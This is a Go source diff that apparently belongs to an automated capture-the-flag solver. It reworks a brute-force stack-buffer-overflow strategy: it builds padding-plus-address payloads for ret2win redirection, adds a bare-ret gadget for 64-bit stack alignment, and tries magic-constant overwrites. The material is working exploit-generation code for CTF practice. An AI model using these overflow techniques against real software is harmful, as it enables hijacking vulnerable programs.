@@ -21,40 +21,43 @@ type tail struct {
 	note  string
 }
 
-// stackOverwriteStrategy brute-forces a line-based overflow. For each padding
-// length it appends each candidate value and runs the target; a flag that
-// appears in the output and not in the payload means the overflow set a guard
-// variable to its required constant or redirected control to a flag-printing
-// function. Padding lengths likely to align with a 32-byte buffer are tried
-// first. Newlines in a candidate are skipped because the target reads one line.
+// stackOverwriteStrategy brute-forces a line-based overflow. A flag that then
+// appears in the output (and not in the payload) means the overflow redirected
+// control to a flag-printing function or set a guard variable to its required
+// constant. The return-address candidates (few) are swept across all padding
+// lengths first, then the magic-constant candidates (potentially many), so a
+// large constant pool can never crowd a ret2win offset out of the search.
+// Newlines in a candidate are skipped because the target reads one line.
 func (s *solver) stackOverwriteStrategy(ctx context.Context) (bool, error) {
-	tails, err := overwriteTails(s.path, s.report.Binary)
+	funcTails, magicTails, err := overwriteTails(s.path, s.report.Binary)
 	if err != nil {
 		return false, err
 	}
-	if len(tails) == 0 {
+	if len(funcTails)+len(magicTails) == 0 {
 		s.report.Limitations = append(s.report.Limitations, "no magic constants or function addresses extracted; overwrite strategy had nothing to try")
 		return false, nil
 	}
 	attempts := 0
-	for _, pad := range paddingLengths() {
-		for _, t := range tails {
-			if err := ctx.Err(); err != nil {
-				return false, err
-			}
-			if attempts >= maxOverwriteAttempts {
-				s.report.Limitations = append(s.report.Limitations, fmt.Sprintf("overwrite brute force stopped at the %d-attempt cap", maxOverwriteAttempts))
-				return false, nil
-			}
-			attempts++
-			payload := make([]byte, 0, pad+len(t.bytes))
-			for i := 0; i < pad; i++ {
-				payload = append(payload, 'A')
-			}
-			payload = append(payload, t.bytes...)
-			note := fmt.Sprintf("padding=%d tail=%s", pad, t.note)
-			if done, err := s.attempt(ctx, "stack_overwrite", note, payload, false); err != nil || done {
-				return done, err
+	for _, phase := range [][]tail{funcTails, magicTails} {
+		for _, pad := range paddingLengths() {
+			for _, t := range phase {
+				if err := ctx.Err(); err != nil {
+					return false, err
+				}
+				if attempts >= maxOverwriteAttempts {
+					s.report.Limitations = append(s.report.Limitations, fmt.Sprintf("overwrite brute force stopped at the %d-attempt cap", maxOverwriteAttempts))
+					return false, nil
+				}
+				attempts++
+				payload := make([]byte, 0, pad+len(t.bytes))
+				for i := 0; i < pad; i++ {
+					payload = append(payload, 'A')
+				}
+				payload = append(payload, t.bytes...)
+				note := fmt.Sprintf("padding=%d tail=%s", pad, t.note)
+				if done, err := s.attempt(ctx, "stack_overwrite", note, payload, false); err != nil || done {
+					return done, err
+				}
 			}
 		}
 	}
@@ -83,48 +86,82 @@ func paddingLengths() []int {
 	return out
 }
 
-// overwriteTails builds the candidate suffixes: 4-byte magic constants scanned
-// from the executable sections (for variable-overwrite guards such as a
-// required auth value) and 8-byte function entry addresses (for return-address
-// redirection on fixed-address binaries). Candidates containing a newline are
-// dropped because the target reads a single line.
-func overwriteTails(path string, bin inspect.Report) ([]tail, error) {
+// overwriteTails builds the candidate suffixes in two groups: function-address
+// redirections (return address, optionally preceded by a stack-aligning ret)
+// and 4-byte magic constants scanned from the executable sections (for
+// variable-overwrite guards such as a required auth value). They are returned
+// separately so the caller can exhaust the small, high-value function group
+// before the potentially large constant pool. Candidates containing a newline
+// are dropped because the target reads a single line.
+func overwriteTails(path string, bin inspect.Report) (funcTails, magicTails []tail, err error) {
 	f, err := elf.Open(path)
 	if err != nil {
-		return nil, err
+		return nil, nil, err
 	}
 	defer f.Close()
 
-	lo, hi := loadableRange(f)
-	magics := scanMagics(f, lo, hi)
+	// Return-address redirection only makes sense for fixed addresses; skip it
+	// when PIE is enabled, where the load base is unknown without a leak.
+	if bin.Protections["pie"].Status != "enabled" {
+		width := 8
+		if bin.Bits == 32 {
+			width = 4
+		}
+		ret, haveRet := retGadget(f)
+		for _, addr := range functionAddresses(bin) {
+			b := addrBytes(addr, width)
+			if !containsNewline(b) {
+				funcTails = append(funcTails, tail{bytes: b, note: fmt.Sprintf("retaddr=0x%x", addr)})
+			}
+			// Alignment variant: prepend a bare `ret` so the called function
+			// starts with RSP shifted by one word. On 64-bit, a function that
+			// calls into libc (printf, system) faults on a movaps when RSP is
+			// not 16-byte aligned; the extra ret fixes the common case.
+			if haveRet && width == 8 {
+				chain := append(addrBytes(ret, width), b...)
+				if !containsNewline(chain) {
+					funcTails = append(funcTails, tail{bytes: chain, note: fmt.Sprintf("ret_align+retaddr=0x%x", addr)})
+				}
+			}
+		}
+	}
 
-	tails := make([]tail, 0, len(magics)+len(bin.Functions))
-	for _, m := range magics {
+	lo, hi := loadableRange(f)
+	for _, m := range scanMagics(f, lo, hi) {
 		b := make([]byte, 4)
 		binary.LittleEndian.PutUint32(b, m)
 		if containsNewline(b) {
 			continue
 		}
-		tails = append(tails, tail{bytes: b, note: fmt.Sprintf("magic32=0x%08x", m)})
+		magicTails = append(magicTails, tail{bytes: b, note: fmt.Sprintf("magic32=0x%08x", m)})
 	}
-	// Return-address redirection only makes sense for fixed addresses; skip it
-	// when PIE is enabled, where the load base is unknown without a leak.
-	if bin.Protections["pie"].Status != "enabled" {
-		for _, addr := range functionAddresses(bin) {
-			width := 8
-			if bin.Bits == 32 {
-				width = 4
+	return funcTails, magicTails, nil
+}
+
+func addrBytes(addr uint64, width int) []byte {
+	b := make([]byte, 8)
+	binary.LittleEndian.PutUint64(b, addr)
+	return b[:width]
+}
+
+// retGadget returns the address of a bare `ret` (0xc3) byte in an executable
+// section, used to realign the stack before a ret2win call.
+func retGadget(f *elf.File) (uint64, bool) {
+	for _, sec := range f.Sections {
+		if sec.Type != elf.SHT_PROGBITS || sec.Flags&elf.SHF_EXECINSTR == 0 {
+			continue
+		}
+		data, err := sec.Data()
+		if err != nil {
+			continue
+		}
+		for i, c := range data {
+			if c == 0xc3 {
+				return sec.Addr + uint64(i), true
 			}
-			b := make([]byte, 8)
-			binary.LittleEndian.PutUint64(b, addr)
-			b = b[:width]
-			if containsNewline(b) {
-				continue
-			}
-			tails = append(tails, tail{bytes: b, note: fmt.Sprintf("retaddr=0x%x", addr)})
 		}
 	}
-	return tails, nil
+	return 0, false
 }
 
 func loadableRange(f *elf.File) (lo, hi uint64) {
